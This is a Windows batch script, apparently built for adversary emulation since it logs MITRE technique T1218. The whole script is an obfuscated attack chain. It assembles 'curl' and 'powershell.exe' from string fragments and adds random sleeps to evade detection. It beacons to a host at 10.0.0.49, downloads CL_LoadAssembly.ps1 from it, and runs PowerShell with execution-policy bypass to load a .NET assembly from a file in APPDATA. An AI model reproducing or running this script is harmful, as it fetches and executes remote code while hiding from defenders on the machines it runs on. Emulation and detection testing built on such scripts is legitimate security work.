@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET txisnba=%APPDATA%\8191\adc8fe25
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8191-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=surfshark.txt
SET dvhhyc=8191

REM Random variables for script use
SET dgppqcsn=%APPDATA%\!rrocubc!\macula-simulations.log
SET yfzst=%APPDATA%\!rrocubc!
SET wqqdygqd=T1218
SET vhrods=0
SET bgogkjq=
SET hkifpgnf=0

REM Initial random delay 30-60s
SET /A mqpsv=!RANDOM! %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_start=!mqpsv!s>> "!dgppqcsn!" 2>nul
timeout /t !mqpsv! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_complete>> "!dgppqcsn!" 2>nul

REM Obfuscated curl command parts
SET pjmkj=cu
SET stmdr=rl
SET rexib= -k
SET bmnur= -s
SET uusvb= -o
SET vyuii= nul
SET pmklq=!pjmkj!!stmdr!
SET sqjfx=!rexib!!bmnur!!uusvb!!vyuii!

REM Heartbeat check with obfuscated curl
SET nbjhscmd=!pmklq!!sqjfx! !keghkgto!
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start=!keghkgto!>> "!dgppqcsn!" 2>nul
!nbjhscmd!
IF !ERRORLEVEL! EQU 0 (
    SET vhrods=1
    SET hkifpgnf=1
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_success>> "!dgppqcsn!" 2>nul
) ELSE (
    SET bgogkjq=connection_refused
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_failed=!ERRORLEVEL!>> "!dgppqcsn!" 2>nul
)

REM TTP logging for T1218
SET hfdtu=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2!
SET avbjm=!TIME:~0,8!.!TIME:~9,2!
SET ttp_line=[!hfdtu! !avbjm!][!jwcnifl!]: !rrocubc!-!dvhhyc!-!wqqdygqd!|Signed_Binary_Proxy_Execution=!hkifpgnf!:!bgogkjq!
echo !ttp_line!>> "!dgppqcsn!" 2>nul || echo.

ping -n 12 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_ping_complete>> "!dgppqcsn!" 2>nul

REM Change directory with indirection
SET cdxd=ch
SET rsgjf=di
SET vikkl=r
SET ymlscmd=!cdxd!!rsgjf!!vikkl!
SET jkwvd=!yfzst!
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!jkwvd!>> "!dgppqcsn!" 2>nul
!ymlscmd! "!jkwvd!" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    SET jkwvd=%TEMP%
    !ymlscmd! "!jkwvd!" 2>nul
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete=!cd!>> "!dgppqcsn!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_choice_complete>> "!dgppqcsn!" 2>nul

REM Download CL_LoadAssembly.ps1 with obfuscated URL construction
SET sqhgv=http://
SET jxbku=!mdvfmsbx!
SET fgjf=!sqhgv!!jxbku!/CL_LoadAssembly.ps1
SET opkj=CL_Load
SET zzxkc=Assembly.ps1
SET download_target=!opkj!!zzxkc!
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: download_start=!download_target!>> "!dgppqcsn!" 2>nul

SET xycqp=-O
SET rltmp=!pmklq! !xycqp! "!download_target!" "!fgjf!"
!rltmp!
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: download_complete>> "!dgppqcsn!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: download_failed=!ERRORLEVEL!>> "!dgppqcsn!" 2>nul
)

REM Random delay 10-29s
SET /A rnddly=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start=!rnddly!s>> "!dgppqcsn!" 2>nul
timeout /t !rnddly! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete>> "!dgppqcsn!" 2>nul

REM Obfuscated powershell command for assembly loading
SET kxwbq=pow
SET zccjn=ers
SET tkjjh=hel
SET kjxcd=l.e
SET uydpd=xe
SET pshbin=!kxwbq!!zccjn!!tkjjh!!kjxcd!!uydpd!
SET gbfbr=-ep
SET lknac= byp
SET ypsba=ass
SET arg1=!gbfbr!!lknac!!ypsba!
SET dterp=-c
SET arg2=!dterp!
SET bdfpa="set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath "
SET bvxqa=!txisnba!\!xzanpex!;[Program]::Dale()"
SET fullcmd=!bdfpa!!bvxqa!
SET execmd=!pshbin! !arg1! !arg2! !fullcmd!

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: assembly_load_start>> "!dgppqcsn!" 2>nul
!execmd!
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: assembly_load_success>> "!dgppqcsn!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: assembly_load_failed=!ERRORLEVEL!>> "!dgppqcsn!" 2>nul
)

timeout /t 15 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_complete>> "!dgppqcsn!" 2>nul
ENDLOCAL